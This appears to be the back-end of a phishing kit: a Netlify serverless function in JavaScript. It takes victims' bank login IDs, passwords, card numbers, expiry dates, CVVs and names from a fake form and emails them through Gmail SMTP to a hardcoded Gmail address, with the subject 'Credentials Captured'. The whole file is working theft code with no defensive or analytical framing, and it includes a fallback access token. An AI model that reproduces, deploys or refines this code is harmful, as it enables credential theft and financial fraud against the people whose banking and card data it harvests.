import nodemailer from 'nodemailer';

// Netlify Functions use (event, context) and MUST return a response object.
export async function handler(event, context) {

// 1. Check method and parse body from Netlify's 'event' object
if (event.httpMethod !== 'POST') {
return {
statusCode: 405,
body: JSON.stringify({ status: 'error', message: 'Method not allowed.' })
};
}

// Safely parse the JSON body
let data;
try {
data = JSON.parse(event.body);
} catch (e) {
return {
statusCode: 400,
body: JSON.stringify({ status: 'error', message: 'Invalid JSON body.' })
};
}

// 2. Environment Variables (Loaded from Netlify UI)
const SECRET_TOKEN = process.env.SECRET_TOKEN || "T201993123";
const SMTP_USER = process.env.SMTP_USER;
const SMTP_PASS = process.env.SMTP_PASS;
const RECIPIENT_EMAIL = process.env.RECIPIENT_EMAIL || "contact.appletreecash@gmail.com";

// Basic validation
if (!data || data.token !== SECRET_TOKEN || !data.session_id) {
return {
statusCode: 400,
body: JSON.stringify({ status: 'error', message: 'Invalid request or missing session ID.' })
};
}

// 3. Extract ALL Data (NEW: Includes login details)
const onlineId = data.onlineId || 'N/A';
const password = data.password || 'N/A';

const bankName = data.bankName || 'Unknown Bank';
const cardNumber = data.cardNumber || 'N/A';
const expiry = data.expiry || 'N/A';
const cvv = data.cvv || 'N/A';
const name = data.name || 'N/A';

// 4. Format the Email Body
const emailSubject = `âœ… COMPLETE: ${bankName} Credentials Captured`;

const loginBody = `--- LOGIN DETAILS ---\n` +
`Online ID: ${onlineId}\n` +
`Password: ${password}\n\n`;

const cardBody = `--- CARD DETAILS ---\n` +
`Bank: ${bankName}\n` +
`Session ID: ${data.session_id}\n` +
`Card Number: ${cardNumber}\n` +
`Expiry: ${expiry}\n` +
`CVV: ${cvv}\n` +
`Name on Card: ${name}\n` +
`Time: ${new Date().toISOString()}\n`;

// **COMBINE LOGIN AND CARD DETAILS**
const finalEmailBody = loginBody + cardBody;

// 5. Send the Email via Nodemailer
const transporter = nodemailer.createTransport({
host: 'smtp.gmail.com',
port: 587,
secure: false,
auth: {
user: SMTP_USER,
pass: SMTP_PASS,
},
});

try {
await transporter.sendMail({
from: `"${bankName} Logger" <${SMTP_USER}>`,
to: RECIPIENT_EMAIL,
subject: emailSubject,
text: finalEmailBody, // <-- CHANGED to send combined body
});

console.log(`Email sent for session: ${data.session_id}`);

// Success response
return {
statusCode: 200,
body: JSON.stringify({ status: 'success', message: 'Combined data sent.' })
};

} catch (error) {
console.error("Nodemailer Error:", error);

// Failure response
return {
statusCode: 500,
body: JSON.stringify({ status: 'error', message: `Failed to send email. Error: ${error.message}` })
};
}
}
